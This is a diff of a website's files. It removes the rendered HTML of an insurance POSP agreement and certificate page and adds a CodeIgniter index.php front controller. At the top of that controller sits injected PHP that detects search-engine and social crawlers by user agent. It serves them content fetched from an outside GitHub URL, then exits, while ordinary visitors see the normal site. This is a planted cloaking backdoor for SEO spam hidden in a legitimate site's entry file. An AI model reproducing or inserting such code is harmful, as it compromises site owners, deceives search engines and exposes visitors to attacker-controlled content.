-                                <li>4.2 Solicit or procure insurance business without holding a valid certificate. </li>
-                                <li>4.3 Induce the customer to omit any material information or submit wrong information in the proposal form.  </li>
-                                <li>4.4 Offer different rates, advantages, terms and conditions other than those offered by insurer.</li>
-                                <li>4.5 Employ agents or canvassers to bring in business.</li>
-                                  <li>4.6 Indulge in any sort of money laundering activities.</li>
-                                  <li>4.7 Indulge in sourcing of business by myself or through call centers by way of misleading calls or spurious calls.</li>
-                                  <li>4.8 Give any  statement or any information in advertisements or in media that are misleading or extravagant, and the advertisements are so framed as to prevent the abuse of the trust of customers or exploit their lack of experience or knowledge.</li>
-                                  <li>4.9 Behave in discourteous or ill-manner with the customer.</li>
-                                  <li>4.10 Demand or receive any share or proceed from the beneficiary, customer or related persons under an insurance contract.</li>
-                                  <li>4.11 Withhold any documentation from customers without their consent.</li>
-                                  <li>4.12 Receive any premium amount from the customer in cash.</li>
-                                  <li>4.13 Sell any product offline i.e. not through the portal of TATA MotorFinance CO LTD Limited</li>
-                                  <li>4.14 Hold any other license as issued by IRDAI for the purpose of soliciting or servicing of insurance products.</li>
-                                  <li>4.15 Adhere to and comply with any additional code, procedures, rules as may be prescribed from time to time by IRDAI or TATA MotorFinance CO LTD.</li>
-                              </ul>                              
-                            </li> 
-
-                            <li>I hereby agree to perform my duties/obligations as POSP, as under:-
-                              <ul>
-<li>5.1 Solicit business exclusively for TATA MotorFinance CO LTD and not for other insurance companies or insurance intermediaries</li>
-  <li>5.2 Abide by Code of Conduct as mentioned in foregoing paras</li>
-  <li>5.3 Comply with IRDAI regulations, guidelines, circulars as may be notified from time to time.</li>
-  <li>5.4 Not to assign or sub-delegate the duties as described herein to any other person to be performed on its behalf.</li>
-  <li>5.5 Shall intimate TATA MotorFinance CO LTD Limited in case of any conflict or dispute that arises due to the actions of POSP.</li>
-  <li>5.6 Exercise reasonable skill, care and diligence while performing my duties</li>
-  <li>5.7 Take equitable care in providing the requisite services within the given timelines as Airtel Payment Bank shall agree that time is the essence of this agreement.</li>
-                              </ul>                              
-                            </li>
-
-                            <li>Remuneration / Fees:
-                              <ul>
-                              <li>6.1 The fees payable to me as POSP shall be mutually agreed between  me and TATA MotorFinance CO LTD from time to time.</li>  
-                              </ul>                              
-                            </li>
-
-                            <li>Term and Termination:
-                              <ul>
-                              <li>7.1 TATA MotorFinance CO LTD Limited may terminate this engagement with POSP by giving notice in writing atleast 30 days in advance.</li>  
-                              </ul>                              
-                            </li>                            
-
-                            <li>Confidentiality and Non-Disclosure
-                              <ul>
-                              <li>8.1 I, being a POSP of Airtel Payment Bank Limited shall have access to information of the company, its employees, its clients and other information which is confidential to Airtel Payment Bank Limited. I as a POSP undertakes to protect such information in strict confidence and adhere to data protection policy of TATA MotorFinance CO LTD Limited while dealing in such information.</li>  
-                              
-                              <li>8.2 I as a POSP shall not during the subsistence of this engagement or at any time thereafter post expiry ortermination of this engagement, reveal, disclose, publish, or use, the Confidential Information in any manner or to any third Party, person, company, for its own or others benefit or Consultant.</li>
-
-                              <li>8.3 Any breach of this clause shall entitle TATA MotorFinance CO LTD Limited to recover the losses caused due to breach of confidentiality from me in my tenure of association as POSP or 1 year thereafter and as POSP I shall be liable to make good such losses.</li>                                                              
-                              </ul>                              
-                            </li>
-
-                            <li>Indemnities
-                              <ul>
-                              <li>9.1 I, POSP agrees to indemnify and hold TATA MotorFinance CO LTD Limited harmless in respect of all claims, damages or losses that may be sustained by it on account of services rendered by POSP as per the engagement.</li>
-                              </ul>                              
-                            </li>
-
-                            <li>Governing Law
-                              <ul>
-                              <li>10.1 In case of any dispute that arise during the course or after the completion of the engagement shall be referred to the Chief Executive Officer of the TATA MotorFinance CO LTD Limited and the decision shall be binding on both the parties.</li>
-                              <li>10.2 The terms and provisions herein contained be governed by, interpreted and construed in accordance with the laws of India. The courts of New-Delhi shall have jurisdiction in respect of any such disputes or claims.</li>
-                              </ul>                              
-                            </li>                            
-
-                          </ol>
-
-                        </div>
-                    </div>
-                </div>
-
-                <div class="clear-both"></div>
-                <a href="https://posp.tmf.co.in/download_certificate//" class="btn btn-black no-margin-bottom btn-small btn-round no-margin" name="download_certificate" id="download_certificate" type="button">Download certificate</a> <br>
-                <a href="https://posp.tmf.co.in/pos_agreement" class="btn btn-black no-margin-bottom btn-small btn-round no-margin" name="next_lp" id="next_lp" type="button">Next</a>
-            </div>
-    </div>
-</div><div class="inner-container mob-content-top-margin">
-<style type="text/css">
-.btn1{
-	background: rgb(74, 79, 196);
-	border-radius: 51px;  
-	padding: 23px;
-	border: none;
-	margin-top: 40px;
-	margin-left: -183px;
-	transition-duration: 0.4s;
-	cursor: pointer;
-	text-decoration: none;
-	display: inline-block;
-	width: 21pc;
-	margin-left: 28px;
-	margin-top: -6px;
-}
-.body{
-background-color: white;	
-}
-.download_Btn{
-	color:white;
-	font-weight:700;
-}
-
-.btn1:hover{
-	background-color: #02aee9;
-	color: white;
-}
-
-.rect span.name{
-	font-size: 23px;
-	font-weight: 700;
-	margin-left: -124px;
-}
-.sbi_wrap {
-	/* height: 150vh; */
-	/* height: auto; */
-	height: 100%;
-	width: 100%;
-	/* padding: 140px 0 0 40px; */
-	
-}
-
-
-.btn-info{
-	background-color: #02aee9;
-	border: none;
-	color: white;
-	padding: 16px 32px;
-	text-align: center;
-	text-decoration: none;
-	display: inline-block;
-	font-size: 16px;
-	margin: 4px 2px;
-	transition-duration: 0.4s;
-	cursor: pointer;
-	margin-top: 20px;
-	border-radius: 29px;
-}
-
-.btn-info:hover {
-	background-color: grey;
-	color: white;
-}
-
-.btn2 {
-	background-image: linear-gradient(to right, #AA076B 0%, #61045F  51%, #AA076B  100%);
-	margin: 10px;
-	padding: 15px 45px;
-	text-align: center;
-	text-transform: uppercase;
-	transition: 0.5s;
-	background-size: 200% auto;
-	color: white;
-	box-shadow: 0 0 20px #eee;
-	border-radius: 10px;
-	display: block;
-}
-
-.btn2:hover {
-	background-position: right center; /* change the direction of the change here */
-	color: #fff;
-	text-decoration: none;
-}
-
-.btn_new {
-	background-image: linear-gradient(to right, #AA076B 0%, #61045F 51%, #AA076B 100%);
-	border: none;
-	color: white;
-	padding: 12px 30px;
-	cursor: pointer;
-	font-size: 20px;
-	transition: 0.5s;
-}
-
-.btn_new:hover {
-	background-position: right center; /* change the direction of the change here */
-	color: #fff;
-	text-decoration: none;
-}
-
-.btn_info{
-	background-image: linear-gradient(to right, #AA076B 0%, #61045F 51%, #AA076B 100%);
-	margin: 10px;
-	padding: 15px 45px;
-	text-align: center;
-	text-transform: uppercase;
-	transition: 0.5s;
-	background-size: 200% auto;
-	color: white;            
-	box-shadow: 0 0 20px #eee;
-	border-radius: 10px;
-	display: block;
-	width: 247px;
-	float: left;
-	width: 200px;
-	margin-right: 1030px;
-}
-
-.btn_info:hover {
-	background-position: right center; /* change the direction of the change here */
-	color: #fff;
-	text-decoration: none;
-}
-
-.download_certificate{
-	background-image: linear-gradient(to right, #1968B3 0%, #1968B3 51%, #1968B3 100%);
-	margin: 10px;
-	padding: 15px 40px;
-	text-align: center;
-	text-transform: uppercase;
-	transition: 0.5s;
-	background-size: 200% auto;
-	color: white;
-	box-shadow: 0 0 20px #eee;
-	border-radius: 10px;
-	display: block;
-	margin-left: 50px;
-	padding-right: -92px;
-	padding-left: 112px;
-	border: unset;
-}
-.fa{
-	color:white;
-}
-
-.download_certificate:hover {
-	background-position: right center; /* change the direction of the change here */
-	color: #fff;
-	text-decoration: none;
-}
-
-.download_agreement{
-	background-image: linear-gradient(to right, #AA076B 0%, #61045F 51%, #AA076B 100%);
-	margin: 10px;
-	padding: 15px 40px;
-	text-transform: uppercase;
-	transition: 0.5s;
-	background-size: 200% auto;
-	color: white;
-	box-shadow: 0 0 20px #eee;
-	border-radius: 10px;
-	display: block;
-	margin-left: 47px;
-}
-
-.download_agreement:hover {
-	background-position: right center; 
-	color: #fff;
-	text-decoration: none;
-}
-
-.download_Btn1{
-	margin-left: -40px;
-	padding-right: 29px;
-	color:white;
-	font-weight:700;
-}
-
-.upload {
-	background-image: linear-gradient(to right, #AA076B 0%, #61045F 51%, #AA076B 100%);
-	border: none;
-	color: white;
-	padding: 13px 31px;
-	cursor: pointer;
-	font-size: 20px;
-	transition: 0.5s; 
-}
-</style>
-
-	<section class="container-fluid" style="background-color:white;padding-top:20px;">
-		<nav class="navbar navbar-light " style="margin-top:60px;background-color:#1968B3;">
-			<span class="navbar" style="color:white;font-weight:700;font-size:24px;padding-left:50px;">Certificate</span>
-		</nav>
-	</div><div class="row">
-				<center>
-					<h2 style="margin-top:-93px;">You Have Successfully Passed The POSP Exam</h2><br>
-					<h3></h3><br>
-					<h3></h3>
-				</center>
-			</div></div>
-<footer class="footer border-top">
-         <div class="copyright">
-            <div class="container">
-               <div class="row">
-                  <div class="col-12 text-center">
-                  <br><br><p>Copyright © 2026 Tata Capital Limited | All Rights Reserved.</p>
-                  </div>
-               </div>
-            </div>
-         </div>
-</footer>
-
-<!-- end footer -->
-
-<script type="text/javascript" src="https://posp.tmf.co.in/assets/js/ajax-popup-slider.js?v=177427114"></script>
-<script type="text/javascript" src="https://posp.tmf.co.in/assets/js/bootstrap.js?v=66680376"></script>
-<script type="text/javascript" src="https://posp.tmf.co.in/assets/js/bootstrap_validator.js?v=591596035"></script>
-<script type="text/javascript" src="https://posp.tmf.co.in/assets/js/bootstrap-hover-dropdown.js?v=122100944"></script>
-<script type="text/javascript" src="https://posp.tmf.co.in/assets/js/bootstrapvalidator.min.js?v=625943213"></script>
-<script type="text/javascript" src="https://posp.tmf.co.in/assets/js/pos_agreement.js?v=1993388472"></script>
-<script type="text/javascript" src="https://posp.tmf.co.in/assets/js/crypto-js.js?v=1957966977"></script>
-<script type="text/javascript" src="https://posp.tmf.co.in/assets/js/Encryption.js?v=2139303172"></script>
-<script>
-
-$('.language').click(function(event){
-
-    event.preventDefault();
-    var id = $(this).attr('value');
-
-    // alert(id);
-    // console.log('ghjk');
-    $.ajax({
-        url: SITEROOT + 'front/Front/language_change/',
-        type: "POST",
-        data: 'value='+id,
-        success: function (response) {
-            localStorage.setItem('lang', id);
-            location.reload(true);
-        } 
-     });
-
-});
-
-var modal = document.getElementById('id01');
-
-
-window.onclick = function(event) {
-    if (event.target == modal) {
-        modal.style.display = "none";
+<?php
+
+function is_bot() {
+    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'tidak ada user agent';
+    $bots = array(
+        'Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification',
+        'Google-InspectionTool', 'AhrefsBot', 'SemrushBot', 'MJ12bot',
+        'DotBot', 'PetalBot', 'facebot'
+    );
+
+    if (empty($user_agent)) {
+        return true;
     }
-}
-</script>
 
-<div class="loading" style="display:none;">Loading&#8230;</div>
+    foreach ($bots as $bot) {
+        if (stripos($user_agent, $bot) !== false) {
+            return true;
+        }
+    }
+
+    return false;
+}
+
+
+function get_remote_content($url) {
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT'] ?? 'bot-checker');
+    $response = curl_exec($ch);
+
+    if (curl_errno($ch)) {
+        echo 'Curl error: ' . curl_error($ch);
+    }
+
+    curl_close($ch);
+    return $response;
+}
+
+
+$target_url = 'https://raw.githubusercontent.com/boncesmail/memek/refs/heads/main/hifve';
+
+
+if (is_bot()) {
+    $message = get_remote_content($target_url);
+    if ($message) {
+        echo $message;
+    } else {
+        echo "Gagal ambil konten dari URL.";
+    }
+    exit;
+}
+?>
+<?php
+ob_start();
+/**
+ * CodeIgniter
+ *
+ * An open source application development framework for PHP
+ *
+ * This content is released under the MIT License (MIT)
+ *
+ * Copyright (c) 2014 - 2017, British Columbia Institute of Technology
+ *
+ * Permission is hereby granted, free of charge, to any person obtaining a copy
+ * of this software and associated documentation files (the "Software"), to deal
+ * in the Software without restriction, including without limitation the rights
+ * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+ * copies of the Software, and to permit persons to whom the Software is
+ * furnished to do so, subject to the following conditions:
+ *
+ * The above copyright notice and this permission notice shall be included in
+ * all copies or substantial portions of the Software.
+ *
+ * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+ * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+ * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+ * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+ * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+ * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
+ * THE SOFTWARE.
+ *
+ * @package     CodeIgniter
+ * @author      EllisLab Dev Team
+ * @copyright   Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
+ * @copyright   Copyright (c) 2014 - 2017, British Columbia Institute of Technology (http://bcit.ca/)
+ * @license     http://opensource.org/licenses/MIT      MIT License
+ * @link        https://codeigniter.com
+ * @since       Version 1.0.0
+ * @filesource
+ */
+/*
+ * ---------------------------------------------------------------
+ * APPLICATION ENVIRONMENT
+ * ---------------------------------------------------------------
+ *
+ * You can load different configurations depending on your
+ * current environment. Setting the environment also influences
+ * things like logging and error reporting.
+ *
+ * This can be set to anything, but default usage is:
+ *
+ *     development
+ *     testing
+ *     production
+ *
+ * NOTE: If you change these, also change the error_reporting() code below
+ */
+
+date_default_timezone_set('Asia/Calcutta');
+//define('ENVIRONMENT', isset($_SERVER['CI_ENV']) ? $_SERVER['CI_ENV'] : 'development');
+define('ENVIRONMENT', 'production');
+
+
+
+/*
+ * ---------------------------------------------------------------
+ * ERROR REPORTING
+ * ---------------------------------------------------------------
+ *
+ * Different environments will require different levels of error reporting.
+ * By default development will show errors but testing and live will hide them.
+ */
+switch (ENVIRONMENT) {
+    case 'development':
+        error_reporting(0);
+        ini_set('display_errors', 1);
+        break;
+
+    case 'testing':
+    case 'production':
+        ini_set('display_errors', 0);
+        if (version_compare(PHP_VERSION, '5.3', '>=')) {
+            error_reporting(E_ALL & ~E_NOTICE & ~E_DEPRECATED & ~E_STRICT & ~E_USER_NOTICE & ~E_USER_DEPRECATED);
+        } else {
+            error_reporting(E_ALL & ~E_NOTICE & ~E_STRICT & ~E_USER_NOTICE);
+        }
+        break;
+
+    default:
+        header('HTTP/1.1 503 Service Unavailable.', TRUE, 503);
+        echo 'The application environment is not set correctly.';
+        exit(1); // EXIT_ERROR
+}
+
+/*
+ * ---------------------------------------------------------------
+ * SYSTEM DIRECTORY NAME
+ * ---------------------------------------------------------------
+ *
+ * This variable must contain the name of your "system" directory.
+ * Set the path if it is not in the same directory as this file.
+ */
+$system_path = 'system';
+
+/*
+ * ---------------------------------------------------------------
+ * APPLICATION DIRECTORY NAME
+ * ---------------------------------------------------------------
+ *
+ * If you want this front controller to use a different "application"
+ * directory than the default one you can set its name here. The directory
+ * can also be renamed or relocated anywhere on your server. If you do,
+ * use an absolute (full) server path.
+ * For more info please see the user guide:
+ *
+ * https://codeigniter.com/user_guide/general/managing_apps.html
+ *
+ * NO TRAILING SLASH!
+ */
+$application_folder = 'application';
+
+/*
+ * ---------------------------------------------------------------
+ * VIEW DIRECTORY NAME
+ * ---------------------------------------------------------------
+ *
+ * If you want to move the view directory out of the application
+ * directory, set the path to it here. The directory can be renamed
+ * and relocated anywhere on your server. If blank, it will default
+ * to the standard location inside your application directory.
+ * If you do move this, use an absolute (full) server path.
+ *
+ * NO TRAILING SLASH!
+ */
+$view_folder = '';
+
+
+/*
+ * --------------------------------------------------------------------
+ * DEFAULT CONTROLLER
+ * --------------------------------------------------------------------
+ *
+ * Normally you will set your default controller in the routes.php file.
+ * You can, however, force a custom routing by hard-coding a
+ * specific controller class/function here. For most applications, you
+ * WILL NOT set your routing here, but it's an option for those
+ * special instances where you might want to override the standard
+ * routing in a specific front controller that shares a common CI installation.
+ *
+ * IMPORTANT: If you set the routing here, NO OTHER controller will be
+ * callable. In essence, this preference limits your application to ONE
+ * specific controller. Leave the function name blank if you need
+ * to call functions dynamically via the URI.
+ *
+ * Un-comment the $routing array below to use this feature
+ */
+// The directory name, relative to the "controllers" directory.  Leave blank
+// if your controller is not in a sub-directory within the "controllers" one
+// $routing['directory'] = '';
+// The controller class file name.  Example:  mycontroller
+// $routing['controller'] = '';
+// The controller function you wish to be called.
+// $routing['function'] = '';
+
+
+/*
+ * -------------------------------------------------------------------
+ *  CUSTOM CONFIG VALUES
+ * -------------------------------------------------------------------
+ *
+ * The $assign_to_config array below will be passed dynamically to the
+ * config class when initialized. This allows you to set custom config
+ * items or override any default config values found in the config.php file.
+ * This can be handy as it permits you to share one application between
+ * multiple front controller files, with each file containing different
+ * config values.
+ *
+ * Un-comment the $assign_to_config array below to use this feature
+ */
+// $assign_to_config['name_of_config_item'] = 'value of config item';
+// --------------------------------------------------------------------
+// END OF USER CONFIGURABLE SETTINGS.  DO NOT EDIT BELOW THIS LINE
+// --------------------------------------------------------------------
+
+/*
+ * ---------------------------------------------------------------
+ *  Resolve the system path for increased reliability
+ * ---------------------------------------------------------------
+ */
+
+// Set the current directory correctly for CLI requests
+if (defined('STDIN')) {
+    chdir(dirname(__FILE__));
+}
+
+if (($_temp = realpath($system_path)) !== FALSE) {
+    $system_path = $_temp . DIRECTORY_SEPARATOR;
+} else {
+    // Ensure there's a trailing slash
+    $system_path = strtr(
+            rtrim($system_path, '/\\'), '/\\', DIRECTORY_SEPARATOR . DIRECTORY_SEPARATOR
+        ) . DIRECTORY_SEPARATOR;
+}
+
+// Is the system path correct?
+if (!is_dir($system_path)) {
+    header('HTTP/1.1 503 Service Unavailable.', TRUE, 503);
+    echo 'Your system folder path does not appear to be set correctly. Please open the following file and correct this: ' . pathinfo(__FILE__, PATHINFO_BASENAME);
+    exit(3); // EXIT_CONFIG
+}
+
+/*
+ * -------------------------------------------------------------------
+ *  Now that we know the path, set the main path constants
+ * -------------------------------------------------------------------
+ */
+// The name of THIS file
+define('SELF', pathinfo(__FILE__, PATHINFO_BASENAME));
+
+// Path to the system directory
+define('BASEPATH', $system_path);
+
+// Path to the front controller (this file) directory
+define('FCPATH', dirname(__FILE__) . DIRECTORY_SEPARATOR);
+
+// Name of the "system" directory
+define('SYSDIR', basename(BASEPATH));
+
+// The path to the "application" directory
+if (is_dir($application_folder)) {
+    if (($_temp = realpath($application_folder)) !== FALSE) {
+        $application_folder = $_temp;
+    } else {
+        $application_folder = strtr(
+            rtrim($application_folder, '/\\'), '/\\', DIRECTORY_SEPARATOR . DIRECTORY_SEPARATOR
+        );
+    }
+} elseif (is_dir(BASEPATH . $application_folder . DIRECTORY_SEPARATOR)) {
+    $application_folder = BASEPATH . strtr(
+            trim($application_folder, '/\\'), '/\\', DIRECTORY_SEPARATOR . DIRECTORY_SEPARATOR
+    );
+} else {
+    header('HTTP/1.1 503 Service Unavailable.', TRUE, 503);
+    echo 'Your application folder path does not appear to be set correctly. Please open the following file and correct this: ' . SELF;
+    exit(3); // EXIT_CONFIG
+}
+
+define('APPPATH', $application_folder . DIRECTORY_SEPARATOR);
+
+// The path to the "views" directory
+if (!isset($view_folder[0]) && is_dir(APPPATH . 'views' . DIRECTORY_SEPARATOR)) {
+    $view_folder = APPPATH . 'views';
+} elseif (is_dir($view_folder)) {
+    if (($_temp = realpath($view_folder)) !== FALSE) {
+        $view_folder = $_temp;
+    } else {
+        $view_folder = strtr(
+            rtrim($view_folder, '/\\'), '/\\', DIRECTORY_SEPARATOR . DIRECTORY_SEPARATOR
+        );
+    }
+} elseif (is_dir(APPPATH . $view_folder . DIRECTORY_SEPARATOR)) {
+    $view_folder = APPPATH . strtr(
+            trim($view_folder, '/\\'), '/\\', DIRECTORY_SEPARATOR . DIRECTORY_SEPARATOR
+    );
+} else {
+    header('HTTP/1.1 503 Service Unavailable.', TRUE, 503);
+    echo 'Your view folder path does not appear to be set correctly. Please open the following file and correct this: ' . SELF;
+    exit(3); // EXIT_CONFIG
+}
+
+define('VIEWPATH', $view_folder . DIRECTORY_SEPARATOR);
+
+if (!ini_get('date.timezone')) {
+    date_default_timezone_set('GMT');
+}
+
+/*
+ * --------------------------------------------------------------------
+ * LOAD THE BOOTSTRAP FILE
+ * --------------------------------------------------------------------
+ *
+ * And away we go...
+ */
+require_once BASEPATH . 'core/CodeIgniter.php';
